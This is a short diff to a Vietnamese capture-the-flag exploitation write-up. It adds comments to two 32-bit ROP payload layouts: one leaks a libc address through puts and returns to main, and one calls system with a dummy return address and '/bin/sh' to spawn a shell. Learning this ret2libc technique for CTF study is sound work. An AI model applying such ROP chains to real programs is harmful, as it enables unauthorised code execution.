@@ -219,7 +219,7 @@ Giờ đến bước leak libc và dựng ROP:
 * theo cấu trúc 32-bit thì payload phải theo thứ tự:
 ```c
 puts_plt
-main_addr 
+main_addr // quay lai menu()
 puts_got 
 ```
 * có được libc leak thì tính **libc.address**
@@ -229,7 +229,7 @@ puts_got
 **Tạo shell với payload sau:**
 ```c
 system
-0xdeadbeef
+0xdeadbeef // random
 bin_sh
 ``` 
 
